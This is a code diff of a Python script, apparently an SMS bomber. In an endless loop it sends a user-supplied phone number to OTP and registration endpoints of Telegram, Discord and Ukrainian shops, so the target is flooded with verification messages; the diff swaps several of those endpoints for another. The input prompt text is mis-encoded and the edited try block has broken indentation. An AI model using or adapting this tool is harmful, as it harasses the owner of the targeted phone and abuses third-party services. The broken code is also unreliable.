@@ -6,19 +6,9 @@ NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
  
 while True:
- try:
+try:
      print('Отправлено')
-     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
- try:
-     print('Отправлено')
-     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
- try:
-     print('Отправлено')
-     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
+     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
      time.sleep(5000)
